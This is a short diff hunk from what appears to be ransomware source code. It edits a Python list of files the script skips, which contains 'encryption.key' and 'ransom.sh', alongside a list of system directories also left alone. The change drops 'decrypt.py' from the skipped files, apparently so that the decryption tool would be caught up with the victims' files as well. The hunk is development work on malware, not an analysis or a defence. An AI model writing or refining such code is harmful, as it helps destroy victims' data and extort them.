@@ -136,7 +136,7 @@ def main():
     
     # Convert exclude_paths to absolute paths
     script_dir = os.path.abspath(os.path.dirname(__file__))
-    exclude_files = ["main.py", "encryption.key", "decrypt.py", "ransom.sh"]
+    exclude_files = ["main.py", "encryption.key", "ransom.sh"]
     exclude_paths = {os.path.join(script_dir, file) for file in exclude_files}
     
     system_paths = ["/usr", "/bin", "/lib", "/etc", "/var", "/opt", "/sbin", "/dev", "/proc", "/sys"]
